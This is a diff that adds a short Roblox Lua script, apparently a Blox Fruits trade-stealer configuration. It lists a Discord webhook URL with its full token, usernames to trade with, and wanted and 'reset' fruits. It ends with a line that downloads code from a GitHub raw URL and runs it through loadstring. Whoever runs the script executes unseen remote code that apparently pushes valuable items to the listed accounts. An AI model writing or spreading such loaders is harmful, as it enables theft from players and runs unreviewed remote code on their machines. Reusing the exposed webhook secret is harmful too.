@@ -1,0 +1,15 @@
+Webhook = "https://discord.com/api/webhooks/1336350872862724136/Xo9JG0uyh_GXvu_gQQFKx057Kk1SRVvOf-ZmdwZAjnNK9v0gf9vuXo5MXZtuUQveiPEK"
+Usernames = {"TrafalgarLaw931", "xDemonstert", "TrafalgarLaw931v2"} -- << Username(-s) it'll accept trade with
+Fruits = {"Gas-Gas", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune", "Dragon(East)-Dragon(East)", "Dragon(West)-Dragon(West)","Control-Control"} -- << Fruits you want
+FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in trade to counter value difference
+    "Gravity-Gravity",
+    "Quake-Quake",
+    "Love-Love",
+    "Spider-Spider",
+    "Magma-Magma",
+    "Ghost-Ghost",
+    "Barrier-Barrier",
+    "Light-Light",
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/script/refs/heads/main/note"))()
